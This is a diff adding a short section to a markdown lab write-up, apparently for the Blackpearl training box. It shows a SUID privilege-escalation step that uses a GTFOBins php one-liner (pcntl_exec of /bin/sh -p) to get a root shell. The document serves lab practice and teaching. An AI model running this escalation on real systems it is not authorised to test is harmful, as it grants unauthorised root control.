@@ -376,7 +376,17 @@ These files are owned by root. When executed, they run with root privileges, reg
 
 The fact 'groups' or 'users' contain 'x' it means that they are able to execute the file... when executed it will execute with the owner privileges, in this case is root.
 
+## GTFOBINS
 
+/usr/bin/php7.3 looks interesting, lets look into GTFOBINS SUID
+
+by using ./php -r "pcntl_exec('/bin/sh', ['-p']);" from GTFOBINS and replacing the initial first bit with the absolute path, we manage to elevate into root.
+
+    /usr/bin/php7.3 -r "pcntl_exec('/bin/sh', ['-p']);" 
+
+![image](https://github.com/user-attachments/assets/4ce681fe-6c1b-4ac8-b911-9977171ffb3b)
+
+![image](https://github.com/user-attachments/assets/5e4fda50-0147-4f15-bd37-446d27766b97)
 
 ## Blackpearl walk through <https://abdhamza.medium.com/tcm-security-blackpearl-box-writeup-cc6be8a0d498>
 
